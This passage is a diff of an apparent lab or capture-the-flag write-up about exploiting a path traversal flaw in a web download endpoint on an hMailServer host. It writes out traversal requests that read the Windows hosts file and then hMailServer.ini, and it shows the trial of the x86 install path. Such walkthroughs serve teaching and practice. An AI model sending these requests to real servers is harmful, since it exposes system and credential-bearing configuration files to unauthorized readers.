@@ -131,18 +131,23 @@ Since the hmailserver direcotry is structured like this C:\Program Files\hMailSe
 GET /download.php?file=..\..\Windows\System32\drivers\etc\hosts HTTP/1.1
 ```
 We can confirm that path traversal is possible:
+
 <img width="1260" height="572" alt="image" src="https://github.com/user-attachments/assets/8b992f42-905c-49bf-acdd-8b1b2f3380c7" />
 
 Now let's try to find where is the .ini or .conf or .cnf file is located inside hMailServer file structure. Their github page can give us some information on the matter:
+
 <img width="1526" height="707" alt="image" src="https://github.com/user-attachments/assets/e88a10ee-39bd-482d-b4aa-cb1e2c278045" />
 
 The .ini file is named hMailServer.ini  and it's located at the \bin directory
+
 <img width="1525" height="252" alt="image" src="https://github.com/user-attachments/assets/689c5060-2f81-4260-913f-a9672ad5c06d" />
 
 Now we can combine the info we alread know and the pathway should be: C:\Program Files\hMailServer\Bin\hmailserver.ini so let's try the request passing this as a parameter: GET /download.php?file=..\..\Program+Files\hmailServer\Bin\hMailServer.ini HTTP/1.1
+
 <img width="1598" height="752" alt="image" src="https://github.com/user-attachments/assets/bd747d67-96c0-43ab-a9c1-738d5ae2aa65" />
 
 Does not work, maybe hmailserver waws installed as 32 bit, try this: GET /download.php?file=..\..\Program+Files+(x86)\hmailServer\Bin\hMailServer.ini HTTP/1.1
+
 This works plenty: <img width="1597" height="755" alt="image" src="https://github.com/user-attachments/assets/5e766160-b8a7-4df8-8847-914df55bb6ff" />
 
 ```bash
